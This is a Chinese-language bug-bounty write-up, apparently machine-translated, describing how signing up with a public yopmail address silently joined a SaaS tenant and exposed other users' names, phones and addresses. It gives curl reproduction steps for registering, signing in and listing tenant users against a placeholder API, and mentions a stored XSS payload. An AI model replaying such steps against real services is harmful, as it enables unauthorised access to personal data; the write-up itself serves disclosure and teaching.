---
title: 一封随意的邮件如何让我发现了别人的租户——未经授权的个人信息访问
url: https://mp.weixin.qq.com/s/PLfSZvJX8bAfg53WUhL1Ug
source: Doonsec's feed
date: 2026-05-21
fetch_date: 2026-05-22T06:05:53.442178
---

# 一封随意的邮件如何让我发现了别人的租户——未经授权的个人信息访问

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/R98u9GTbBnuKa0jxEmlZ9g4CXL0sTvBca1avSNPIQ2ULeTgPsQIgGh0WXqO8n2sib8oXLnXwZmtiafhqVasmYF2YtNicFIsibbKRLC8Qiauz3hH4/0?wx_fmt=jpeg)

# 一封随意的邮件如何让我发现了别人的租户——未经授权的个人信息访问

haidragon
haidragon

安全狗的自我修养

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# 官网：http://securitytech.cc

**这本该是侦察中最无聊的部分。**

请按回车或点击查看全尺寸图片

![](https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBnsQ6edcnW6487cFziaouqQEGb7qhY6A3fPeaXn4w0uAOXMNicbAWgcbGKPZoFOR2pggUnRtgPpGYy1mPPZUCJUj9Wn0x8yN3rNtw/640?wx_fmt=png&from=appmsg)

> 我有了新的目标。在建筑技术领域，它是多租户SaaS，攻击面不错，Burp历史中没有明显的低垂功能。我做的第一件事就是直接**\*注册**\*。注册一个账号，四处点击，看看应用内部的样子。我几乎从不在前**二十**分钟内找到任何东西。

**##**这次不同。**匿名账号**

我用的是我一直用来处理优先客户的邮箱。一个新的“@yopmail.com”地址。如果你从未使用过Yopmail，它是那种任何猜到你地址的人都能看到你的收件箱的公共邮箱。猎人喜欢它，因为你不需要注册。选个名字，它存在。

我选了“XXXX@yopmail.com”。设置密码。输入了一个假的职位名称。点击提交。通过Yopmail的网页收件箱点击了验证链接。签到。

请按回车或点击查看全尺寸图片

![](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBnvIyFofzdK5Iiar96Y1GhKV0nJtGrxHFIibyHJiaLS3s1QBsPwndqKuaiaAcfMsy7ohNWMq5gDbTJcB3gWCfnyl8lgx9ib8H11PH4EM/640?wx_fmt=png&from=appmsg)

登录

然后我看了登录回复。

```
```json
{
"_id": "USR269123",
"email": "XXXX@yopmail.com",
"companyId": "152734",
"company": {
"_id": "152734",
"name": "test",
"domain": "yopmail.com",
"createdAt": "2026–01–12T05:02:32.733Z",
"users": [
 { "user": "033569", "role": "admin", "assignedOn": "2026–01–12T05:02:32.731Z" }
 ]
 }
}
```

请按回车或点击查看全尺寸图片

![](https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBnsnm9m7lfjicFuGNIOQibXL3z8dUNIkYnUxqv5PIaWCQiadx0LfES8IeQUros1LbPRdXqHjpQxsgzic8oJT5z8xp7oJvFf1Ru1gho0/640?wx_fmt=png&from=appmsg)

**我读了两遍。—— “createdAt： 2026–01–12**”。比我早四个月。我**今天**\*注册的。我没有创建公司。注册向导里没有“**创建公司**”这一步。那这是谁的公司？

**## 第一个奇怪的事**

其实在我问其他问题之前，我注意到了第二件奇怪的事。在我全新的账户上，已经填好了两个字段。

一个电话号码。“+91 830085XXXX”，标记国家代码“**US**”。什么。

一个化身。“Screenshot+2023–03–02+at+4.18.59+PM.png”，放在某个S3桶上，**显然是三年前别人上传**的。

我从未上传过截图。我不是那种在注册时会上传自拍的人。而且我绝对没有输入别人的电话号码。

**注册流程是从某处复制数据。**

**## 拉线**

如果我所在的租户不是我创建的，那个租户还有其他成员。于是我问了它。

```
curl -s 'https://api.vulnerable.com/api/v4/enterprise/users' \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-company-id: 152734"
```

请按回车或点击查看全尺寸图片

![](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBnsGo8VTWDEgWqI8oktic8ejNk08t5NudZTNndzNXpftPlr2oVRRTCWOFe0r4THicfRrGSOg1XbmWNWCAlQRvgcS8mfG2VVAJUyoE/640?wx_fmt=png&from=appmsg)

**15个用户的信息回来了。**

他们全都在《@yopmail.com》。所有邮件都有邮箱、全名、电话号码（大多数是“+91”，有些是“+1”）、职位名称和最后一次活跃时间戳。其中一个有完整的项目记录。姓名**、街道地址、邮政编码、城市、州和地理位置坐标（纬度/±ng）。**

这些是别人的测试账户。有些看起来像是内部质量控制。有些看起来像是其他虫猎人在戳同一个目标。其中一个名字里存储了一个XSS有效载荷（“<u>Test</u>'），这又是另一个等待发现的发现。

我用一个匿名邮箱注册，点击了一个验证链接，并阅读了另外十五个人的联系方式。零剥削。零授权绕过。一点巧妙的载荷都没有。直接注册吧。

**## 为什么这有效**

应用中每个租户都有一个**“company.domain”**字段。当有人注册时，后台会查询“是否有现有租户的'域名'与注册邮件的域名匹配？”如果有，它会默默地将新用户加入该租户。没有邀请。没有管理员批准。没有证据证明你实际上拥有那个域名。

某个时候，有人创建了一个“测试”公司，并在上面写了“域名：”**yopmail.com“**。大概是开发者觉得没人会注意到。从那时起，所有YOPMAIL注册都会自动合并。

**这就是明显的失败。**

**## 为什么比看起来更糟**

YOPMAIL的箱子是我可以安全摔倒的。我加入的租户里有很多其他测试人员，所以泄露对测试人员来说是可见的，很快就能察觉，对真正的客户来说并没有造成隐私灾难。

有趣的失败在于它对称的一切。

**## 报告**

繁衍步骤是最无聊的部分，因为几乎没什么可做的。

> 我在**高中**写了。CVSS 7.5。OWASP的框架是A01破损访问控制和A04不安全设计，但说实话，称之为“访问控制”有点低估了它。门禁系统技术上是正常工作的。问题是系统根据我“@”后面的字符串\*决定\*我是别人的群组成员。

1. **注册**

```
curl -s -X POST 'https://api.vulnerable.com/api/v1/users/register' \
  -H 'Content-Type: application/json' \
  -d '{
"email":"XXXX@yopmail.com",
"password":"Your Strong Password",
"firstName":"time",
"lastName":"test",
"jobTitle":"QA"
  }'
```

**2. 点击@yopmail收件箱中的验证链接。**

**3. 登录。回复中的公司ID不是你的。**

```
TOKEN=$(curl -s -X POST 'https://api.vulnerable.com/api/v4/users/signin' \
  -H 'Content-Type: application/json' \
  -d '{"email":"XXXX@yopmail.com","password":"Your Strong Password"}' \
  | jq -r '.result.token')
```

**4. 阅读你被合并的租户团队名单。**

```
curl -s 'https://api.vulnerable.com/api/v4/enterprise/users' \
-H "Authorization: Bearer $TOKEN" \
-H 'x-company-id: 152734'

Result: You guys will get the all PII information from the tenet.
```

**5. 结果：**你们将从租户那里获得所有个人身份信息。

**## 我从中得到了什么**

1. **请阅读报名回复：**

   我差点关掉标签页。我差点就进入“真正”的测试阶段了。Burp，模糊端点，寻找深度流中的IDOR。整个bug都在我从“POST /signin”收到的JSON文件里，那个文件是纯文本，比我的账户早四个月。
2. **无聊并不无聊：**

   多租户隔离是每个SaaS都坚称自己做对了，但实际上一半的SaaS却犯错，直到有人用正确的邮箱注册后才会察觉。YOPMAIL是个很棒的金丝雀。如果公共邮箱域名悄无声息地将你加入租户，那就是租户模型存在问题。
3. Yopmail的租户恰好在我能看到的地方。

```
console.log("Thank You");
```

* ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBnvlMvRXpqJ0lx1NibvpNubN7A9nxpnrLqEp2CUsicSzC8tfFOwL4EDcsl5wObB3JoRKsic75icFNt84OLI6z55jfTNgjTpgPKvXTOU/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=5)

  ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBnttMfia7IORVviaEzC91lUBic1onLfibxdibDSoNXF4hbic6hvZ6ic30ZW1EW2Ds27UlsZWLF6GkiceRk3PsQuoFK7Lqo0bFHR60hibG0RA/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=7)

  ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPZeRlpCaIfwnM0IM4vnVugkAyDFJlhe1Rkalbz0a282U9iaVU12iaEiahw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=z84f6pb5&tp=webp#imgIndex=5)

+ 公众号:安全狗的自我修养
+ vx:2207344074
+ http://gitee.com/haidragon
+ http://github.com/haidragon
+ bilibili:haidragonx

+ ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPMJPjIWnCTP3EjrhOXhJsryIkR34mCwqetPF7aRmbhnxBbiaicS0rwu6w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=omk5zkfc&tp=webp#imgIndex=5)

```

```

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERH8N8KjDo7DwKbNkHbLeSV917gqKcuKHWeINcgDQYWVq7WaRpFQCc3TvfLLJrrjaiaLCElA7oflv0A/0?wx_fmt=png)

安全狗的自我修养

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERH8N8KjDo7DwKbNkHbLeSV917gqKcuKHWeINcgDQYWVq7WaRpFQCc3TvfLLJrrjaiaLCElA7oflv0A/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过